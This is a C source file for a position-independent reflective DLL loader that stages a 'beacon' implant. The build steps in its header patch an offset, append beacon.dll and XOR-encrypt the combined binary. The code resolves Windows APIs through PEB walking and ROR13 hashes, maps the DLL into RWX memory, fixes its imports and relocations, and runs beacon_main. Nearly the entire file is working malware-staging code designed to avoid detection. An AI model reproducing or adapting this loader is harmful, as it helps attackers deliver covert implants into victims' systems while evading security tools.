/*
 * reflective_loader.c — C-based Reflective DLL Loader (PIC-compatible)
 * 
 * Compiled as a standalone PIC raw binary:
 *   x86_64-w64-mingw32-gcc -c -O2 -fPIC -nostdlib -fno-stack-protector \
 *       -o reflective_loader.o reflective_loader.c
 *   x86_64-w64-mingw32-objcopy -O binary reflective_loader.o reflective_loader.bin
 *
 * The builder then:
 *   1. Patches the DLL_OFFSET placeholder in the .bin
 *   2. Concatenates: reflective_loader.bin + beacon.dll
 *   3. XOR-encrypts the combined binary
 *
 * IMPORTANT: This file has NO external dependencies (no CRT, no imports).
 * All API resolution is done manually via PEB walking + export parsing.
 */

/* ═══════════════════════════════════════════════════════════════════════════ *
 *  PE / NT structures (minimal for 64-bit)
 * ═══════════════════════════════════════════════════════════════════════════ */

typedef unsigned char  BYTE;
typedef unsigned short WORD;
typedef unsigned int   DWORD;
typedef unsigned long long QWORD;  /* 64-bit (Windows LLP64: long is 32-bit) */
typedef int            BOOL;

#define NULL ((void*)0)

/* DOS header */
typedef struct {
    WORD  e_magic;    /* "MZ" */
    WORD  e_cblp;
    WORD  e_cp;
    WORD  e_crlc;
    WORD  e_cparhdr;
    WORD  e_minalloc;
    WORD  e_maxalloc;
    WORD  e_ss;
    WORD  e_sp;
    WORD  e_csum;
    WORD  e_ip;
    WORD  e_cs;
    WORD  e_lfarlc;
    WORD  e_ovno;
    WORD  e_res[4];
    WORD  e_oemid;
    WORD  e_oeminfo;
    WORD  e_res2[10];
    DWORD e_lfanew;
} IMAGE_DOS_HEADER;

/* PE header signature */
#define IMAGE_NT_SIGNATURE  0x00004550  /* "PE\0\0" */

/* Machine types */
#define IMAGE_FILE_MACHINE_AMD64  0x8664

/* Optional header magic */
#define IMAGE_NT_OPTIONAL_HDR64_MAGIC  0x020B  /* PE32+ */

/* Directory entries */
#define IMAGE_DIRECTORY_ENTRY_EXPORT     0
#define IMAGE_DIRECTORY_ENTRY_IMPORT     1
#define IMAGE_DIRECTORY_ENTRY_BASERELOC  5

/* Section characteristics */
#define IMAGE_SCN_MEM_EXECUTE   0x20000000
#define IMAGE_SCN_MEM_READ      0x40000000
#define IMAGE_SCN_MEM_WRITE     0x80000000

/* Relocation types */
#define IMAGE_REL_BASED_ABSOLUTE  0
#define IMAGE_REL_BASED_DIR64     10

/* Memory flags */
#define MEM_COMMIT    0x1000
#define MEM_RESERVE   0x2000
#define PAGE_NOACCESS         0x01
#define PAGE_READONLY         0x02
#define PAGE_READWRITE        0x04
#define PAGE_EXECUTE          0x10
#define PAGE_EXECUTE_READ     0x20
#define PAGE_EXECUTE_READWRITE 0x40

/* DLL reasons */
#define DLL_PROCESS_ATTACH  1
#define DLL_PROCESS_DETACH  0
#define DLL_THREAD_ATTACH   2
#define DLL_THREAD_DETACH   3

/* Export directory */
typedef struct {
    DWORD Characteristics;
    DWORD TimeDateStamp;
    WORD  MajorVersion;
    WORD  MinorVersion;
    DWORD Name;
    DWORD Base;
    DWORD NumberOfFunctions;
    DWORD NumberOfNames;
    DWORD AddressOfFunctions;
    DWORD AddressOfNames;
    DWORD AddressOfNameOrdinals;
} IMAGE_EXPORT_DIRECTORY;

/* Section header */
typedef struct {
    BYTE  Name[8];
    DWORD VirtualSize;
    DWORD VirtualAddress;
    DWORD SizeOfRawData;
    DWORD PointerToRawData;
    DWORD PointerToRelocations;
    DWORD PointerToLinenumbers;
    WORD  NumberOfRelocations;
    WORD  NumberOfLinenumbers;
    DWORD Characteristics;
} IMAGE_SECTION_HEADER;

/* Import descriptor (20 bytes) */
typedef struct {
    DWORD OriginalFirstThunk;
    DWORD TimeDateStamp;
    DWORD ForwarderChain;
    DWORD Name;
    DWORD FirstThunk;
} IMAGE_IMPORT_DESCRIPTOR;

/* Import by name */
typedef struct {
    WORD  Hint;
    BYTE  Name[1];
} IMAGE_IMPORT_BY_NAME;

/* Base relocation block */
typedef struct {
    DWORD PageRVA;
    DWORD BlockSize;
} IMAGE_BASE_RELOCATION;

/* ═══════════════════════════════════════════════════════════════════════════ *
 *  Helper: ROR13 hash (reimplements the assembly function)
 * ═══════════════════════════════════════════════════════════════════════════ */

static DWORD ror13_hash(const char* name) {
    DWORD h = 0;
    char c;
    while ((c = *name++) != 0) {
        if (c >= 'a' && c <= 'z') c -= 32;  /* uppercase */
        h = ((h >> 13) | (h << 19)) & 0xFFFFFFFF;
        h += (BYTE)c;
    }
    return h;
}

/* ═══════════════════════════════════════════════════════════════════════════ *
 *  Helper: resolve export by hash (kernel32 -> function pointer)
 * ═══════════════════════════════════════════════════════════════════════════ */

static void* resolve_api(void* kernel32, DWORD hash) {
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)kernel32;
    BYTE* base = (BYTE*)kernel32;
    
    /* PE header */
    DWORD* nt = (DWORD*)(base + dos->e_lfanew);
    if (*nt != IMAGE_NT_SIGNATURE) return NULL;
    
    /* Optional header start = PE + 0x18 (COFF header is 20 bytes) */
    BYTE* opt = (BYTE*)(nt + 1) + 16;  /* nt is at PE, opt is PE+0x18 */
    /* Actually: NT headers = PE offset, PE sig is 4 bytes, then COFF header (20 bytes), then optional header */
    /* So optional header = base + dos->e_lfanew + 4 + 20 = base + dos->e_lfanew + 0x18 */
    opt = base + dos->e_lfanew + 0x18;
    
    /* PE32+: DataDirectory[0] at opt + 0x70 */
    /* Export directory is DataDirectory[0] at opt + 0x70 */
    DWORD exportRVA = *(DWORD*)(opt + 0x70);
    if (exportRVA == 0) return NULL;
    
    IMAGE_EXPORT_DIRECTORY* exp = (IMAGE_EXPORT_DIRECTORY*)(base + exportRVA);
    
    DWORD* names = (DWORD*)(base + exp->AddressOfNames);
    WORD*  ords  = (WORD*)(base + exp->AddressOfNameOrdinals);
    DWORD* funcs = (DWORD*)(base + exp->AddressOfFunctions);
    
    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        const char* fn = (const char*)(base + names[i]);
        if (ror13_hash(fn) == hash) {
            DWORD funcRVA = funcs[ords[i]];
            /* Forwarded exports start with '.' and point to another DLL */
            if (funcRVA >= exportRVA && funcRVA < exportRVA + 0x28 + exp->NumberOfNames * 4 + exp->NumberOfFunctions * 4)
                continue;  /* Skip forwarded exports */
            return (void*)(base + funcRVA);
        }
    }
    return NULL;
}

/* ═══════════════════════════════════════════════════════════════════════════ *
 *  Helper: memcpy (no CRT dependency)
 * ═══════════════════════════════════════════════════════════════════════════ */

static void my_memcpy(void* dst, const void* src, DWORD len) {
    BYTE* d = (BYTE*)dst;
    const BYTE* s = (const BYTE*)src;
    for (DWORD i = 0; i < len; i++) d[i] = s[i];
}

static void my_memset(void* dst, BYTE val, DWORD len) {
    BYTE* d = (BYTE*)dst;
    for (DWORD i = 0; i < len; i++) d[i] = val;
}

/* ═══════════════════════════════════════════════════════════════════════════ *
 *  Helper: wcslen for wide DLL names in import descriptors
 * ═══════════════════════════════════════════════════════════════════════════ */

static int my_strlen(const char* s) {
    int n = 0;
    while (*s++) n++;
    return n;
}

/* ═══════════════════════════════════════════════════════════════════════════ *
 *  ENTRY POINT — called by PIC bootstrap
 *
 *  Layout in memory when called:
 *    [this loader code][beacon.dll file data]
 *
 *  R15 = loader entry address (passed by bootstrap)
 *  R14 = DLL file data address
 * ═══════════════════════════════════════════════════════════════════════════ */

/* Typedef for the API function pointers */
typedef void* (__stdcall *pfnVirtualAlloc)(void*, QWORD, DWORD, DWORD);
typedef void* (__stdcall *pfnLoadLibraryA)(const char*);
typedef void* (__stdcall *pfnGetProcAddress)(void*, const char*);
typedef BOOL  (__stdcall *pfnDllMain)(void*, DWORD, void*);

/* These symbols are set by the builder patch step */
extern QWORD _dll_offset_marker;  /* Actually the 4 magic bytes + QWORD offset */
extern void _reflective_loader_start(void);

/* Alternative: the bootstrap assembly calls this C function with:
 *   RCX = kernel32 base
 *   RDX = this loader's base address (R15)
 *   R8  = DLL file data address (R14)
 *   R9  = beacon_main RVA (from config structure)
 */
void reflective_load_core(
    void* kernel32,
    void* loader_base,
    void* dll_src_raw,
    QWORD beacon_main_rva)
{
    /* ── Resolve needed kernel32 APIs ── */
    pfnVirtualAlloc   pVA  = (pfnVirtualAlloc)  resolve_api(kernel32, 0x302EBE1C);
    pfnLoadLibraryA   pLLA = (pfnLoadLibraryA)  resolve_api(kernel32, 0x8A8B4676);
    pfnGetProcAddress pGPA = (pfnGetProcAddress)resolve_api(kernel32, 0x1ACAEE7A);
    
    if (!pVA || !pLLA || !pGPA) return;
    
    /* ── Parse PE headers of the DLL file data ── */
    BYTE* dll = (BYTE*)dll_src_raw;
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)dll;
    if (dos->e_magic != 0x5A4D) return;  /* "MZ" */
    
    DWORD* nt_sig = (DWORD*)(dll + dos->e_lfanew);
    if (*nt_sig != IMAGE_NT_SIGNATURE) return;
    
    BYTE* nt_headers = dll + dos->e_lfanew;
    BYTE* opt = nt_headers + 0x18;  /* Optional header (PE32+) */
    
    WORD machine = *(WORD*)(nt_headers + 4);
    if (machine != IMAGE_FILE_MACHINE_AMD64) return;
    
    WORD magic = *(WORD*)opt;
    if (magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) return;
    
    /* PE32+ field offsets from optional header start */
    QWORD imageBase = *(QWORD*)(opt + 0x18);    /* ImageBase (OH+0x18) */
    DWORD sizeOfImage = *(DWORD*)(opt + 0x38);  /* SizeOfImage (OH+0x38) */
    DWORD entryPointRVA = *(DWORD*)(opt + 0x10); /* AddressOfEntryPoint (OH+0x10) */
    WORD  sizeOfOptHdr = *(WORD*)(nt_headers + 0x14); /* SizeOfOptionalHeader (COFF+16) */
    
    /* Section headers = opt + sizeOfOptHdr */
    IMAGE_SECTION_HEADER* sections = (IMAGE_SECTION_HEADER*)(opt + sizeOfOptHdr);
    WORD numSections = *(WORD*)(nt_headers + 4 + 2); /* NumberOfSections (COFF+2) */
    
    /* ── Allocate memory for the DLL at preferred base (or any address) ── */
    void* mapped = pVA((void*)imageBase, sizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!mapped) {
        /* Fallback: let system choose */
        mapped = pVA(NULL, sizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if (!mapped) return;
    }
    
    QWORD delta = (BYTE*)mapped - (BYTE*)imageBase;
    
    /* ── Map sections ── */
    for (WORD i = 0; i < numSections; i++) {
        DWORD dstRVA = sections[i].VirtualAddress;
        DWORD srcRaw = sections[i].PointerToRawData;
        DWORD rawSize = sections[i].SizeOfRawData;
        DWORD virtSize = sections[i].VirtualSize;
        
        if (rawSize == 0 && virtSize == 0) continue;
        
        BYTE* dst = (BYTE*)mapped + dstRVA;
        
        if (srcRaw != 0 && rawSize > 0) {
            /* Copy raw data from file to memory */
            my_memcpy(dst, dll + srcRaw, rawSize);
        }
        
        /* Zero-fill BSS (virtual size > raw size) */
        if (virtSize > rawSize) {
            my_memset(dst + rawSize, 0, virtSize - rawSize);
        }
    }
    
    /* ── Resolve imports ── */
    DWORD importDirRVA = *(DWORD*)(opt + 0x78); /* DataDirectory[1] = Import */
    if (importDirRVA != 0) {
        IMAGE_IMPORT_DESCRIPTOR* imp = (IMAGE_IMPORT_DESCRIPTOR*)((BYTE*)mapped + importDirRVA);
        
        while (imp->Name != 0) {
            const char* dllName = (const char*)((BYTE*)mapped + imp->Name);
            
            /* Convert to wide for LoadLibraryW, or use LoadLibraryA */
            void* hDll = pLLA(dllName);
            
            if (hDll) {
                QWORD* oft = (QWORD*)((BYTE*)mapped + (imp->OriginalFirstThunk ? imp->OriginalFirstThunk : imp->FirstThunk));
                QWORD* iat = (QWORD*)((BYTE*)mapped + imp->FirstThunk);
                
                while (*oft != 0) {
                    void* func = NULL;
                    
                    if (*oft & 0x8000000000000000) {
                        /* Ordinal import */
                        WORD ordinal = (WORD)(*oft & 0xFFFF);
                        func = pGPA(hDll, (const char*)((QWORD)ordinal));
                    } else {
                        /* Name import */
                        IMAGE_IMPORT_BY_NAME* ibn = (IMAGE_IMPORT_BY_NAME*)((BYTE*)mapped + *oft);
                        func = pGPA(hDll, (const char*)ibn->Name);
                    }
                    
                    if (func) {
                        *iat = (QWORD)func;
                    }
                    
                    oft++;
                    iat++;
                }
            }
            
            imp++;
        }
    }
    
    /* ── Apply base relocations ── */
    DWORD relocDirRVA = *(DWORD*)(opt + 0x98); /* DataDirectory[5] = Base Reloc (OH + 0x70 + 5*8 = 0x98) */
    if (relocDirRVA != 0 && delta != 0) {
        BYTE* relocBase = (BYTE*)mapped + relocDirRVA;
        IMAGE_BASE_RELOCATION* block = (IMAGE_BASE_RELOCATION*)relocBase;
        
        while (block->PageRVA != 0 && block->BlockSize != 0) {
            WORD* entries = (WORD*)(block + 1);
            DWORD count = (block->BlockSize - 8) / 2;
            
            for (DWORD i = 0; i < count; i++) {
                WORD entry = entries[i];
                WORD type = entry >> 12;
                DWORD offset = entry & 0xFFF;
                
                if (type == IMAGE_REL_BASED_DIR64) {
                    QWORD* patchAddr = (QWORD*)((BYTE*)mapped + block->PageRVA + offset);
                    *patchAddr += delta;
                }
                /* IMAGE_REL_BASED_ABSOLUTE (0) is a no-op */
            }
            
            block = (IMAGE_BASE_RELOCATION*)((BYTE*)block + block->BlockSize);
        }
    }
    
    /* ── Call beacon_main(0, NULL) directly ── *
     * We bypass _start/pic_bootstrap.asm to avoid __main (MinGW CRT init)
     * which can crash when the PE is not registered with the OS loader.      */
    if (beacon_main_rva != 0) {
        typedef void (*beacon_main_t)(int, char**);
        beacon_main_t bm = (beacon_main_t)((BYTE*)mapped + beacon_main_rva);
        bm(0, NULL);
    } else {
        /* Fallback: call the PE entry point (as DllMain) */
        pfnDllMain dllMain = (pfnDllMain)((BYTE*)mapped + entryPointRVA);
        if (dllMain) {
            dllMain(mapped, DLL_PROCESS_ATTACH, NULL);
        }
    }
}
